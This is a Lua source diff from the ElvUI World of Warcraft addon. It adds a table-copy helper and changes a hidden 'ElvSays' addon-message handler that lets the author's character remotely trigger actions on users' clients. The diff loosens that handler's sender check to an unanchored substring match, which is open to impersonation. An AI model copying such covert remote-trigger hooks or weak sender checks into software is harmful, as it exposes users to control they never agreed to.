@@ -313,6 +313,21 @@ function E:IsFoolsDay()
 	end
 end
 
+function E:CopyTable(currentTable, defaultTable)
+	if type(currentTable) ~= "table" then currentTable = {} end
+	
+	if type(defaultTable) == 'table' then
+		for option, value in pairs(defaultTable) do
+			if type(value) == "table" then
+				value = self:CopyTable(currentTable[option], value)
+			end
+			currentTable[option] = value			
+		end
+	end
+	
+	return currentTable
+end
+
 function E:SendMessage()
 	local numParty, numRaid = GetNumPartyMembers(), GetNumRaidMembers();
 	local inInstance, instanceType = IsInInstance()
@@ -333,19 +348,19 @@ end
 --CHANNEL = Channel to announce it in
 --MESSAGE = Actual Message
 --SENDTO = For whispers, force users to whisper other users
---/run SendAddonMessage('ElvSays', '<SENDTO>,<CHANNEL>,<MESSAGE>,<SENDTO>, 'PARTY')
+--/run SendAddonMessage('ElvSays', '<SENDTO>,<CHANNEL>,<MESSAGE>,<SENDTO>', 'PARTY')
 function E:SendRecieve(event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
 		if sender == E.myname then return end
 
-		if prefix == "ElvUIVC" and sender ~= 'Elv' and sender ~= 'Elv-Illidan' then
+		if prefix == "ElvUIVC" and sender ~= 'Elv' and not string.find(sender, 'Elv-') then
 			if tonumber(message) > tonumber(E.version) then
 				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from www.curse.com"])
 				self:UnregisterEvent("CHAT_MSG_ADDON")
 				self:UnregisterEvent("PARTY_MEMBERS_CHANGED")
 				self:UnregisterEvent("RAID_ROSTER_UPDATE")
 			end
-		elseif prefix == 'ElvSays' and (sender == 'Elv' or sender == 'Elv-Illidan') then ---HAHHAHAHAHHA
+		elseif prefix == 'ElvSays' and (sender == 'Elv' or string.find(sender, 'Elv-')) then ---HAHHAHAHAHHA
 			local user, channel, msg, sendTo = string.split(',', message)
 			
 			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
